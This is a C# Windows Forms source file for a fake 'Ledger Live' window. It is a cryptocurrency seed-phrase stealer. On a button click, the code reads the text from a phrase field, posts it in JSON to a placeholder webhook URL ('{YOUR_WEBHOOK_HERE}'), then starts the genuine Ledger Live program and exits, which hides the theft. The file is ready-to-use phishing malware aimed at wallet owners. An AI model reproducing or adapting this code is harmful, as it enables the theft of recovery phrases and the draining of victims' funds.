using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace Ledger_Live
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.MaximizeBox = false;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {


        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            Program.IsLooped = false;

            string webhookUrl = "{YOUR_WEBHOOK_HERE}";

            string jsonPayload = $@"{{
            ""embeds"": [
                {{
                    ""title"": ""Embed Title"",
                    ""description"": ""{PhraseText.Text}"",
                    ""color"": 16711680
                }}
            ]
            }}";

            using (HttpClient httpClient = new HttpClient())
            {
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                HttpResponseMessage response = httpClient.PostAsync(webhookUrl, content).Result;
            }

            string LedgerPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Ledger Live\Ledger Live.exe";
            Process.Start(LedgerPath);
            Environment.Exit(0);
        }
    }
}